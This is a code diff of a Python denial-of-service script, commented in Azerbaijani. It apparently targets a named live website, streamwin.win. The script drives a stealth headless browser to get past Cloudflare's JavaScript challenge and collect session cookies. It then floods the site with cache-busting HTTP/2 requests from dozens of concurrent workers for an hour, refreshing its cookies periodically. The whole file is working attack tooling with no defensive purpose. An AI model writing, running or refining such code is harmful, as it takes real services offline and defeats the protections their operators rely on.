@@ -1,70 +1,82 @@
 import asyncio
 from playwright.async_api import async_playwright
-from playwright_stealth import stealth_async
+from playwright_stealth import stealth
 import httpx
 import time
 
-# --- AYARLAR ---
+# --- KONFİQURASİYA ---
 TARGET_URL = "https://streamwin.win"
-WORKERS = 500  # Railway güclüdür, 10-20 arası edə bilərsən
-DURATION = 3600 # 1 SAATLIQ HÜCUM
+WORKERS = 40  # Railway-in gücünə görə artırıla bilər
+DURATION = 3600 # 1 Saat
+
+async def get_valid_session(p):
+    """Cloudflare bypass edib kuki və UA qaytarır"""
+    browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
+    context = await browser.new_context(
+        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+    )
+    page = await context.new_page()
+    await stealth(page) # Düzəliş edildi: stealth funksiyası burada çağırılır
+    
+    try:
+        await page.goto(TARGET_URL, wait_until="networkidle", timeout=60000)
+        await asyncio.sleep(10) # JS Challenge üçün gözləmə
+        
+        cookies = await context.cookies()
+        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
+        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+        
+        await browser.close()
+        return cookie_str, user_agent
+    except Exception as e:
+        print(f"[-] Bypass xətası: {e}")
+        await browser.close()
+        return None, None
 
 async def attack_worker(worker_id):
     async with async_playwright() as p:
-        # Brauzeri başladırıq
-        browser = await p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
-        context = await browser.new_context(
-            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-        )
-        page = await context.new_page()
-        await stealth_async(page)
+        start_time = time.time()
         
-        print(f"[*] Worker {worker_id} Cloudflare qorumasını keçməyə çalışır...")
-        
-        try:
-            # 1. ADDIM: Brauzerlə giriş et və Cloudflare kukilərini (Cookie) al
-            await page.goto(TARGET_URL, wait_until="networkidle")
-            await asyncio.sleep(10) # JavaScript challenge-in həlli üçün vaxt
+        while time.time() - start_time < DURATION:
+            cookie, ua = await get_valid_session(p)
             
-            cookies = await context.cookies()
-            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
-            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-
-            # 2. ADDIM: Alınan kukilərlə yüksək sürətli HTTP/2 Flooder-ə keç
-            print(f"[+] Worker {worker_id} Bypass uğurlu! Yüksək sürətli hücum başlayır...")
+            if not cookie:
+                await asyncio.sleep(5)
+                continue
+                
+            print(f"[+] Worker {worker_id}: Bypass uğurlu! Hücum başlayır...")
             
+            # HTTP/2 Flood hissəsi
             async with httpx.AsyncClient(http2=True, verify=False, timeout=10.0) as client:
-                start_time = time.time()
-                while time.time() - start_time < DURATION:
+                inner_start = time.time()
+                while time.time() - inner_start < 600: # Hər 10 dəqiqədən bir kukini yenilə
                     try:
-                        # Artıq brauzer yox, sürətli paketlər göndərilir
                         tasks = []
-                        for _ in range(50):
+                        for _ in range(30): # Saniyəlik paket sıxlığı
                             headers = {
                                 "User-Agent": ua,
-                                "Cookie": cookie_str,
-                                "Accept": "*/*",
-                                "Referer": TARGET_URL
+                                "Cookie": cookie,
+                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                                "Referer": "https://www.google.com/"
                             }
-                            # Cache busting (Keş keçmə)
-                            url = f"{TARGET_URL}/?v={time.time()}&r={worker_id}"
+                            # Cache-Busting
+                            url = f"{TARGET_URL}/?nocache={random_str()}"
                             tasks.append(client.get(url, headers=headers))
                         
-                        responses = await asyncio.gather(*tasks, return_exceptions=True)
-                        success = len([r for r in responses if hasattr(r, 'status_code') and r.status_code == 200])
-                        print(f"🚀 Worker {worker_id}: {success} sorğu göndərildi", end="\r")
-                        
-                    except Exception as e:
-                        pass
-        except Exception as e:
-            print(f"Error in worker {worker_id}: {e}")
-        finally:
-            await browser.close()
+                        await asyncio.gather(*tasks, return_exceptions=True)
+                        print(f"[*] Worker {worker_id} --> Sorğu dalğası göndərildi", end="\r")
+                    except:
+                        break # Bloklansa yeni kuki almağa get
+
+def random_str():
+    import random
+    import string
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
 
 async def main():
-    print("🔥 RAILWAY HIGH-POWER CLOUDFLARE BYPASS INITIALIZED")
-    workers = [attack_worker(i) for i in range(WORKERS)]
-    await asyncio.gather(*workers)
+    print(f"🚀 RAILWAY HYBRID ATTACK STARTED ON {TARGET_URL}")
+    tasks = [attack_worker(i) for i in range(WORKERS)]
+    await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
     asyncio.run(main())
